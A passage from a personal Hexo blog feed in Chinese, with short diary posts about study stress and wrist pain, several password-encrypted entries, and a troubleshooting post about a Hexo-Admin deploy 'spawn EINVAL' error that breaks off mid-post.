    <url>/2025/03/10/myname/</url>
    
    <content type="html"><![CDATA[<p>妈妈说改名的事情</p><p>其实小的时候很期待改名，虽然我没有认识和自己同名的人，但老能听到认识的人说她的同学、朋友是同名，所以期待有一个不那么大众的、特别的名字。</p><p>不知道什么时候开始，提到被污名化的字里老能见到，于是倔强地不想改了</p><p>不知道自己在反叛些什么。。。</p>]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Tenosynovitis</title>
    <link href="/2025/03/04/tenosynovitis/"/>
    <url>/2025/03/04/tenosynovitis/</url>
    
    <content type="html"><![CDATA[<p>手腕手指都好疼</p><p>今晚回去就把绑带戴上</p>]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SaySomething</title>
    <link href="/2025/03/03/saysomething/"/>
    <url>/2025/03/03/saysomething/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="bf74e5a6f5c42f36e7b181a61855a7bd9c8c821b76fbe8410815b86b12809b75">6222236dcbbcc351b7428c08c375b05c05d567cbbdb9125659192fbe447ba2dee40b2b4f829b889ef9410a7e54bce0d65ce25f6a9be9da8b2bceb85cf307df10c2a7fa2378845ff55924712dec506300b6d6835a34557fad9ca61c56fda738c4cc6966203e2cdd2f01f0ca4d6eb5bf51ca686cfee1b8334ccf5c017ef14672d3a62abe54109a13bdcacb1aa60456962c07eff61551080d7cc9686b102aa7bc0d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default"></span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Forsake</title>
    <link href="/2025/03/01/forsake/"/>
    <url>/2025/03/01/forsake/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="1ff46c59359980cee845262223c41f538a5890df01cf8b8b7bf4bb3f45dca885">0648cd8d957666a6fa9197b0cb999a83178e28f8ab93174ed41e721cce3da1cb75f9bc400074bbc948ddb59aa8f5e95642df92c8a7549caa2e2555b524015426f85cbeac27a46435e088daf2e0118c50230fb5d64d188ee20a4d2183afae364a981379d1d6bfb600e971de779663cee0</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Please enter my Bday, hope u remember!</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Anxious</title>
    <link href="/2025/02/25/anxious/"/>
    <url>/2025/02/25/anxious/</url>
    
    <content type="html"><![CDATA[<p>屏蔽不到半个月就要去考教资的焦虑。。。</p><p>活不下去。。</p>]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Library</title>
    <link href="/2025/02/23/library/"/>
    <url>/2025/02/23/library/</url>
    
    <content type="html"><![CDATA[<p>(*￣︶￣)</p>]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>NewSemester</title>
    <link href="/2025/02/22/newsemester/"/>
    <url>/2025/02/22/newsemester/</url>
    
    <content type="html"><![CDATA[<p>返校了。。。</p><p>上午返校，下午就坐进图书馆</p><p>一到要学习的时候，就开始觉得所有事情都有意思了</p><p>–</p><p>有没有人在这段时间偷偷看？kkkkk</p>]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MCM</title>
    <link href="/2025/01/24/mcm/"/>
    <url>/2025/01/24/mcm/</url>
    
    <content type="html"><![CDATA[<p>好想打退堂鼓回家，但是不可以！</p><p>感觉其实我没什么特别要做的，根本没有数据集。。。</p><p>好的，我会在今天把大部分完成的</p>]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CallNICETuiTangGu</title>
    <link href="/2025/01/22/callNICEtuitanggu/"/>
    <url>/2025/01/22/callNICEtuitanggu/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="3ccda20c76d887d25dbba336cd2750285193ce322fe14d6638d4cffe1d486697">e944ae1ab32de7f897a70c9dfa3cd7999d63ae8d01d652333e6955579f2aa73943c61da689174f73378eb7c5f301add239e499c5f6965be399c97c735dae8ae90553d9423b1352c617b991e15b28062e9219f72cc3c36822e3015421929fa814a65d89080095513ae0a21c11f54ecbbbc70a761d5cb7f73d7ccbb14d0fb859eec5fabd58c11ef89f02c813dfdf192329e187038b38fb765c80ca56ac90d201e6a2ccfba14fb091e1bcc614450b5645d8ac4bf367e54dc3a813e008b037ee34a9e99dc3f537f864e6008898953121242422ff06e6daaeadd335d00e6bc67a052debe78ab1100ececdb0ba1967f94d0534c707068505daf2eae3a5115ac93f2defde4d1941acab94f52756a9edb479ee6912e0a438c5135502b49a2329a4a60fefb1d24ceb1ce7e77c49064c5eccb245c121b1a4d45412a4bc61a4f8642cf8014affa7b88d26c33c65b743fdf3f36260b18b0f41fe28fbda6a6e246f0659767b8e27e5d5426db5d36cbc980673194e9f23b1fa428ddf3a580c6e6d75eec2dacd4f19d1616e7e8db18ec90eb39c91f1bf254576f8426c9e4524021a4b104e3095812d8f4f21077e0ee1f60808bdbd1a18c3d49b15cb0f8f338cc5baf7c996627a2c4e107d8e8f57aa44b762b737ac67003054cedf2aafb9623b115799a9c3eb560a9e2f68c5ea44ccc015bffdc87dd0227b3427950eefc789e36496de37befc3553da283af9272521f0f390a1299d0765c592d7e3d5afee6fc2fd6472e29966d65d8b0ebd2b7b9dae722a96c9258d63be7d590b716392cc4b27477ac62d90bdab36b44f22d427b90ad44bd1e5e4994c9267fff4b96b78c8eb30b93fc8adf8ddc1f6fbf8344bc1614a522d70bc707fd87d068e55b95e1d6d8176b9d3b9b1f066ff33342fcc14ff4a91c0e949cb94a182ee8583ab7f028c6829a5bb481a2cbe353045a9831415ea94370cbabc8f235913895f8e61b840650245cebe984432a27b8ad2780d9c044048d13e50ad2d80cf9e0544e193838cb15be335c065b4d35c01ba87b40fc050fc99d0889d968697a7a3487f629649ddfd7251db843be881d4c19c9433cbb2a022b1c27ffe5dc00d719cd9dca028ff41bc4f8ca054dca0f61a94232d87f8a19a19ddb0e5d4eeb03199674df0649d1b82b86dd7d4ab5c57152449f28204546e6b30eb2379ab8ef0bd6ec81c2b96471aa58cd0ad9de6f0c8413dce8e45a041d02edeee0d29ae1fb2f02abddb2ab9a7809ba07d2a67ad4e5c0ee740cd62e6e3b8e2f6d49a31c795a4dab57e2389723f1001214fecc1ce432de5ba1eb2db8af05bcbc9d6bf9eaacea25d23a78d45ed0940b50f518d7a5a0fc3a00bdcc810f4a454a2404c5ccbe504bb94dd966fe4d42e850b6cbfff0dfd4d9dfe3a6a1fb85b8b82611306cddde93d87871e36d9636393796a87bfd1d4d13e1c7786d3664f5b902355a9632960d0f825092ae6f41e8f080e93d3c2160128cf0864f5e754413f4a38af848d9e544155f8b6dd4e5c6aa778dfb76c74293319292bd5b4260b9a7b808ed083e9eeacf7ccb904dfe6ffb905f5cdb9e11596438b6a5accaf6ac1036095e8716418819c17a8e0e88d2a615fcac8c52bffbdd53871a347631d87188af3758c86f40890c3e42584c4932f13fadc6ee8b468d22c031a7bc47b6f3dc8f9a491162c79543813798235224268f222f6f01007d17275694e4e95cdc01891c7ada74549010b8f006d6e8cf638c0a007538e9e7a7d1c134ba19467b4a262bbb5c89bb56a93ca5b896e22f661ea63ffea1ec06618790861de4902bb313af9fadb8c06d52291849ab8385701a1d585b717ba6a594cf41ce438baf5cf3f1c2c7a0d0440f2c1055e7502f899b93f3d3e1033ba80ff35ee41443c301fc57c2d1b0239b884dc681d62c555dd56cc81050a0be8195d96440a488721696c20d65848352eee71ce2d417f5d4c9423748f180050309ac9265f4cdc66b510e357a0a4de80b0f1396469edb0bc7f305437daf797dd8e9ae44e3ff70296ccd3523632a5fd662de774af0c689522a5572cbb071bbbaf56759765ec5800beb03a0f71b514700a5c03c05c15d089557a583289c9f831c74616d7c49f2c49a5b96b318804f255c793065b9070c6abebf48da3f25b4a93fda049b646af6efc1a0d6b9d86be4448adc0446675c75aa1f789215a7987d9f6243905c7586b10694a80cba576cf25ffb1f3cfacccbe4c71b5fdedcefba0c717f3bab70bb7ec87846d5bdb32ef6bc44ad7306002a473164b2d3b755d6ce71b5ba9eb33d08df9229d23f402ca76e1e4b1d2812626774b88534ec94859bad4afd67e75f9cb50c840d4f08e4034b5107ed2ebd7a6f19e2e857caf04cbeb2ea4011e59e945d58a03cf7a0a9a29295edf062221560764d10109ec5a9904d03d1140edaf5db401ff4827868d3e38f78e74e5546c5e40cfb255c03b5c03901ea892da31832ba85a614d25ae53c6665b506ac08bb6ad88238be7d77cd5d814ee4cc262a40ba840a9b190cab98c4195eb64c75852126e19550cdf887d2c465a4709e517b3e6a2e4da5f8b53d1e491eb014fe0f58ff01379e1b81362d21d36a34c1522e2fced5d2d5b94170bd1274b8134aaa15b6855db84175e2e263fc4f7aa5a22547ae7cdb08c1c546294c48536a212f3229261c5e23c1e5f21bec9fdea031230df9e8878b9a70f4e969db4a92bab56ed7c61e8b0e3f42f20dec5d2f69f342ebf36881cb5b2805854c316dd5c620823f381101842f7fff8b558c70e22cb32212a68e1aa31e0aa9fe044003f35488b5fc5766ab1f8df76397143ab8fdbeee225c81b1a766e34a440ce3bbccc9fac0b39d7e9a3553c25da112244cad52379d1efa93e28ff03ba04940728b0daafa8ff755e822e85334604342bb5b1d0ba3d92639ee3e17d31561eff38b9dedfd8c8af8abba05a339bd13ef9255670d875512064e34f8773547182f3dfeab15abe17bcc329ebdf4cefbdf4e01fedf37998e91e2d4f23da23884d81def98b691b846d2bedd54bb5ed455b355629f582367f6613d6d7040e137dc360fe9ca5914b5ce6c2695f6e5e3ebc27038d87f06a80104c418b7b5318d2f770f41e6f62c3f9ebcd6a6ebd9246f6a1a9d52200372e5ee29f999232182a5132dab10e7d96882bb5abced8a634d387785172066f24c09cabbabbb07414640a6de5ac1900b08cc63d68b29d3ecc76a07d3b45f1d03896361d7e4d62069037fc54a1441a34e80d160642777dd7dd7ce12d411fdd380fe4a67553e3544be299885fbac676b28d281376b2dd691198244344d1640763aac9b0abd272afd42885590a6147616bee4562247908c996800f7f1d8aec87ee1ab5c70a23bc3a3e0ced8c8b4f46c79c1ebd931a54678b0ea133e7fced5f3aa789d973b3c76b283421a749542113cad1b1df0b09f38aa4b0bdff1fc1183475eeced5c83b130fde49a8e3a14a3a67d61f6a7b47d329f50b520e1db000c971434b500237d6e4804ee45e7a4eaa1448e854fd2ef3b6067af2acb8ab956efc384f1a91127ca0dafb661a04602f211dfce6832903a9d88d5da14953f87ca37eb361bc3c5f6f63577dd444842bd93d4055104690f614876bc042d3ca985c57a3fcb02abc6021f4041f24c8529f6fe942716911f40f510bec181c8e6d94b1b067b088b11c05055c876c78a6274fddd71b5547ac412f3cde9c3d82b667054f5c02d461bc90975a66df368b7b837f4a8d223713864cc133db6a6b7a3daf5e1683587aef67a705fd103784b2f4c7337c332c07170b0acf7777eda2a241e0a6613a6c7168bf0de39d8451eaec156621922311ef3b341e2906a97ed3cb7a6cc37a2f1d4894da1b63214310f75b2d5f3e3d21715da8429d9434056a4ae7fe8e1f2e5753592ee09ade92c6d05eeb8c40528afd679e913178b00b28e6cea696a632e41646bde557e97605f9ec5124fbad716a2d3e8ac27735f66125e87b8392e73a09ece75f285e87ef9002db11a565f4d1606e6c68b45901b7a6eac566a3ac528eb8a9d93dff617bf90a8f885adaf260b44a11678c8d50fb516c876a7d46c44fde3cf7e384062b19c813590dcf4369e3cf843e4cde2a8d2bad8adc638123360b68d2d2198170000e3d0e6f03430ff0fbe110971d5c1453e7438eb07fd314d7da9bda5a211960da7475483ebae08dd697d3cb9dd791e0e1a94a36b08acb15869243df3b49747acc90f098cbe0c87402cb3aa74cc85b5fca6a5d29a909c88aa9c43c202642d05a52bea2e0b0b01a42408e91b34ac43d0cc5d59d82aaab481874b5267849237c3a5331834d6595946125bdff5f8cfc9b4d218618e16e27a37e919e163567fc8719a94508c12e92e675a939dab59ab389f51c127107eff776d92fb8c575fdbe6a10795f73c1c1c95c9e63ba7e583896dfab8bcb052555981e7abc68d74c605d46c56f6936961875964eecfed73bee4d34191ecf14e88a603b34f95d5f6c47c7d03779a59dfbeed85df18edde518d0f7212ae93d7030c581241f45c43a8346bec5fd056eeb1044079e0ec8d18c585fb614b67a54f79a20a9e9691340b23796524b53046d7c268c17f90d63305fe80c68882d9d7a621fbccd2b4854c94615cd6788c66de9d5f8bd4b27593eed7152f54aeace1b76b8e2b3139bfad528ce66594a72f9159ce7f17605e79d953efd201ffacf19690a55503984843dec54017c6f2d601a44becfca226dbf80ba89a4766a9f9b05654ec6c6c0e2350b9b9b9a1a1f5dda790769c827cca6f57220c2f356940939441b07992864e30becbaded8ffd4db3c73742d41c3b3006af2ea7f9cfdf26ea2b2d0ae9d089b207fcf7f64bafa09abc55cdfe579be94a95bb49d1cb896b8a1e846ea8707de1ffa38025a18803bebfa33c4c01d871a1ee943464bde44659c2bdeaa658f636c75ab44c8c6fd6d179731c4b87c797c3e8b654eb95642e8568548b9ea3216674513db9708b4107b5bebbc1bc4f49d1627d8f77bb125979e64fecd91bb05cedac036d16937dfc22952d521e5fdc736cd7f0ac9cf3b40bcaf66b316ebf46113bab6519c3efb9e45c0eb8e1e</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Please enter the Secret Word!</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CallJuanHappyDog</title>
    <link href="/2025/01/19/calljuanhappydog/"/>
    <url>/2025/01/19/calljuanhappydog/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="b77537017f6712d09f8011a47372b73dde796ede9f497514c2c88d427cabda74">e944ae1ab32de7f897a70c9dfa3cd799b1568d694fc06b9d71961eb24c9647e4983520fd926b99385eaa0fe219978e7c13212849d36fc01be1b8509a2f970538b5179b0f6b1c3e828c45a7b614dd9ef3e11dcf32f389612aa0b45e7879eda12f8efcf164aba4e97657b105eefc5262031a378350704b59ed6e3671c398bcaaf1baf3e54d3100fdfdb45bbfeae9aa320c0d88ad18244f36e124499713f96fc40caa53b1dcd5f3b9c1578d41716ed516b92dd9923f78964746d51e0d2a1770eab4b5ef80dd15e4cafdc0743d223c814ef52c44d7b77f02c842237c91a0705f8dbf4f5bd87b0e68cafd38c3b62d90dff3babe185fd44515a0747550506de2b24345d6c8281a6d5918ee3f190982dad65267d332018bc21e54531d25dfb1c07dac1905e6fb5045b0640317804003841fc23d3b7020e592f7252d79c7ecb70b7c2021da4eff1014615a408934d76eda20d3d6368486f8ebb57ef9a75114496ad5d20becf56c541956d97c92f6249b170e327c16abd46cf15b6495bef42a6c4f3f47ec41f84076e51642236217f1f3b28553772e51ab3971b798a032c5d9308ad26b28b2bcadf4428c07e57aa338d0c8e2d7e5c4b8643fdd66fa56c0cf188f55d41a73506f920b582145dc8dc5755817106a38ed90fa79a9deea2af18d35748cfb1e823020bdc213903e2f1ec835b37b53fff3085f6b0b80d7f4f7be8820260152c01202481f66e11d35ba3e622a3c031a50acefd6aa97528678ebfabc43bb2b61a2d32ebbdce993d7d2f0408bf4160f676d80c2f215d0ab1155edddcceb79b5330076d70dafaa0549977e5dd37d9902124bb3a434a61c493b656cf865d431acd49059f8f09ced5fbc8fc5e6955f488ef4743c486b4d7b2574d4dbd402a6455c64baeeb6c8e5fcc191eed2fcd78a272ba83adf4d2eab8b8ebd9423d98296c912b33e1f0cafd498008e9fbbf31a30bb814b23cd8b8a312c553f2e49752423a8c53f5fde54137053e7778f860fdc13b965c7fd1e86cd32b7734cc24c8e7cf646c1ac23c125c70cba542747d008f2e800010443a5d730b1a453219efe6962ecac0d3cac6a751aa95eecd5c2dc5486ce45a8cdc297894929542f050ae0a5c9d0668e7202f3b0749cb9574a17882e4eec55ad1d478afdc44e9a57b5204da069a86c6d6e9864bd2f7765d0dfd6e69ab674373eb702c9979e30270e5ce163eddc54ef3e7d5c330684d07a410f421d6cdc2c144f562261c970f31b9482d2efad7af372442c8a2c28ed645025be3e754a2d04ebcf41a6def13e2eedc1170dea42225f11cb249f4e5d0de019edf95a4412ab748f3fea8d8084c9cc3650e321b6a3a72c83b12e0f4fa432705d5d47a6bcb4d99f126bb4034fa5be8d0b799fbad6d2c5b9ea75a8587557872164ed92cbe1c18f860da4db502638f218859e85c6d2688a63811c6476d2fc0caacd9f640ffcde484c85d46063aa7c0096647716442f75b896f66d1eaa20aed529f0fca4745a94d28bf1cb239c6a7427d8a076bdb5f647a22fcd1f5cd6744246b3312c6cce7e50600f67b8d15e71f715a753582f023db33e5fd18e95f66b787b1e675d06fc1da356c858e7fe8d2f676149d9090f4f519d6e823a8473b8c88d1f36146f348e403b1bddc35d9033bb5aa087844424477af179711fd088b62a9958245163107e4eaf8213bfdda08e86e438289f0be32db2b68f47b0506761531321b29f756210ee739ce5c28e74d8d68c86eceaf355e51a4894d29228afca786c4d5ae4227ecbb16eff23238655ddabf0f77ff210ed5a31812a952849aa6f42968733b3b326f6d3436c9f9287b9b1bd7a7ba37a36b1bf0a458230cc5cf2342ca5dc7415cb2503669ef314d05b3fb90ad103db71e8a73feae715b91d4d70b7770f0a53df9fb51cb1fe1f1e1ea516b794414fe28b36940e559747e276a944ce2986d9fd3212f1b8ed9447132fb9b0dee59964d30bb77f134b7120d0fde6d2832ebb2d0ebb5a91a3836e0ce41ab9d45b8062b12cf6bb22fb841d758bb7a73708ba16dfdac9ab2c3f888223bbdf304005dc1ab217aca4d55e957b471dd5c1b22d5bd26e8256408784c18df7d71d38117ddbd9946a93887520f48e8f311b082965e46c8e4bff9cbaf1689d0670aeafc2b610830250e1c20c884e24ad74023cc28ecc93dc523a20f9e1c9d2ed08ea8e5f1607d291f2328106470b1736d21c4513776ffcd22247fffee75a56d3442b57a312e2fc6b332b34c3f3060f39cc3aadd911528be9d020389ecca13d4cc066890aab658c637a4eb67495493822ccc713f1cc8a76e9700c91bda802842ef075e6fc6ab131b4f41a32df2b835be7c6401a3b99180a6993ed49b9483ce5215a5bd322ba4c672a01e7d802f160ed6a7efa6db54bd80aabcd5370a03b3f10045d1473dbcb2a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Please enter the Secret Word!</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ScreenShot</title>
    <link href="/2025/01/14/screenshot/"/>
    <url>/2025/01/14/screenshot/</url>
    
    <content type="html"><![CDATA[<p>研究了好几个截屏软件，最后发现都没有扣扣截图好用哈。</p>]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Bug</title>
    <link href="/2025/01/09/bug/"/>
    <url>/2025/01/09/bug/</url>
    
    <content type="html"><![CDATA[<p>为什么这个脚本老是卡住，好烦！</p><p>我要重启试试</p><p>–</p><p>最后发现pycharm右键可以正常运行，但是终端不行？</p><p>从来没这样过，以前不会配环境的时候倒是会反过来。。</p><p>至今没明白为什么。。。</p>]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Reviewing</title>
    <link href="/2025/01/03/reviewing/"/>
    <url>/2025/01/03/reviewing/</url>
    
    <content type="html"><![CDATA[<p>开始复习了才知道这ppt有多混乱。。上一个的小点在下一个大点里面是怎么能写出来的。。。</p>]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ChatGPT</title>
    <link href="/2025/01/03/ChatGPT/"/>
    <url>/2025/01/03/ChatGPT/</url>
    
    <content type="html"><![CDATA[<p>想给脑子内接一个chatgpt。。背不出来也能胡说八道。。。。</p><p>不想背书。</p>]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2021-2025</title>
    <link href="/2025/01/02/2021-2025/"/>
    <url>/2025/01/02/2021-2025/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="78317d9221ad4be2d74db1d9d53038bb6bcf7e0530db42beaae6d309b8166b73"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Please enter my Bday, hope u remember!</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Endorse</title>
    <link href="/2024/12/27/endorse/"/>
    <url>/2024/12/27/endorse/</url>
    
    <content type="html"><![CDATA[<p>不想背书。</p><p>（打出一个反抗的句号，然后狼狈地打开pdf。）</p>]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Go to Review</title>
    <link href="/2024/12/27/goToReview/"/>
    <url>/2024/12/27/goToReview/</url>
    
    <content type="html"><![CDATA[<p>啊啊啊啊快去复习啊，不要再因为不想复习把别的事情都做一遍了！！</p>]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hexo-Admin</title>
    <link href="/2024/12/27/Hexo-Admin/"/>
    <url>/2024/12/27/Hexo-Admin/</url>
    
    <content type="html"><![CDATA[<h1>有关Hexo-Admin插件的问题</h1><h3 id="Problem-1">Problem 1.</h3><p>首先是原来之前搭的时候已经配过了，完全忘记密码了，还去搜了一下Hexo Admin忘记密码了怎么办。。。这个倒是小问题，一搜就可以解决</p><hr><h3 id="Problem-2">Problem 2.</h3><p>然后是在运行时使用以下语句出现了权限问题：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo server -d<br></code></pre></td></tr></table></figure><p>尝试在命令中直接指定端口，<code>8080</code> <code>8000</code>或者别的没有被占用且有权限的都可以</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo server -d --port 8080<br></code></pre></td></tr></table></figure><p><s>还尝试了在<code>./_config.yml</code>文件的<code>admin:</code>字段下添加<code>port: 8080</code>，但是失败了，猜测可能不能用这种方式指定端口</s></p><hr><h3 id="Problem-3">Problem 3.</h3><p>最大的问题是，在搭建好后使用Hexo Admin点击<code>Deploy</code>会报错：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Error: spawn EINVAL<br></code></pre></td></tr></table></figure><p>完整的报错信息如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">EEE Error: spawn EINVAL<br>    at ChildProcess.spawn (node:internal/child_process:414:11)<br>    at spawn (node:child_process:761:9)<br>    at module.exports (D:\IT\blog\node_modules\hexo-admin\deploy.js:14:14)<br>    at D:\IT\blog\node_modules\hexo-admin\api.js:413:7<br>    at D:\IT\blog\node_modules\hexo-admin\api.js:141:7<br>    at call (D:\IT\blog\node_modules\connect\index.js:239:7)<br>    at next (D:\IT\blog\node_modules\connect\index.js:183:5)<br>    at next (D:\IT\blog\node_modules\connect\index.js:161:14)<br>    at next (D:\IT\blog\node_modules\connect\index.js:161:14)<br>    at next (D:\IT\blog\node_modules\connect\index.js:161:14)<br>    at next (D:\IT\blog\node_modules\connect\index.js:161:14)<br>    at next (D:\IT\blog\node_modules\connect\index.js:161:14)<br>    at next (D:\IT\blog\node_modules\connect\index.js:161:14)<br>    at next (D:\IT\blog\node_modules\connect\index.js:161:14)<br>    at next (D:\IT\blog\node_modules\connect\index.js:161:14)<br>    at next (D:\IT\blog\node_modules\connect\index.js:161:14)<br>    at next (D:\IT\blog\node_modules\connect\index.js:161:14)<br>    at D:\IT\blog\node_modules\body-parser\lib\read.js:137:5<br>    at AsyncResource.runInAsyncScope (node:async_hooks:203:9)<br>    at invokeCallback (D:\IT\blog\node_modules\raw-body\index.js:238:16)<br>    at <span class="hljs-keyword">done</span> (D:\IT\blog\node_modules\raw-body\index.js:227:7)<br>    at IncomingMessage.onEnd (D:\IT\blog\node_modules\raw-body\index.js:287:7) &#123;<br>  errno: -4071,<br>  code: <span class="hljs-string">&#x27;EINVAL&#x27;</span>,<br>  syscall: <span class="hljs-string">&#x27;spawn&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>_config.yml</code>文件中有关hexo-admin的配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Deployment</span><br><span class="hljs-comment">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="hljs-attr">deploy:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">git</span><br>  <span class="hljs-attr">repo:</span> <span class="hljs-string">git@github.com:r0otsu/r0otsu.github.io.git</span>    <br>  <span class="hljs-attr">branch:</span> <span class="hljs-string">main</span><br><br><span class="hljs-comment"># hexo-admin authentification</span><br><span class="hljs-attr">admin:</span><br>  <span class="hljs-attr">username:</span> <span class="hljs-string">..</span><br>  <span class="hljs-attr">password_hash:</span> <span class="hljs-string">..</span><br>  <span class="hljs-attr">secret:</span> <span class="hljs-string">..</span><br>  <span class="hljs-attr">deployCommand:</span> <span class="hljs-string">&#x27;hexo-deploy.bat&#x27;</span><br></code></pre></td></tr></table></figure><p><code>hexo-deploy.bat</code>文件中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d<br></code></pre></td></tr></table></figure><p>其中<code>hexo-deploy.bat</code>文件与<code>_config.yml</code>文件都在hexo的根目录下。</p><hr><p>kimi了一下发现好像是bat文件没有传入进<code>spawn</code>函数中去：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs markdown">spawn EINVAL 